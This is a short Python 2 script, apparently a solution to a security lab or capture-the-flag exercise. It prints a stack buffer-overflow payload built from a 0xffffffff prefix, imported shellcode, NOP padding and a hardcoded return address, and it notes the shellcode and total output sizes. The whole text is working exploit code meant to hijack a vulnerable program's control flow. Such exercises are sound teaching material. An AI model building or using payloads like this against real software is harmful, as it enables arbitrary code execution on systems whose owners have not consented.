from struct import pack
from shellcode import shellcode
print pack("<I", 0xffffffff) + shellcode + '\x90' * 37 + pack("<I", 0xbffeb670)

# shellcode size = 24 bytes
# Total output size = 108 bytes
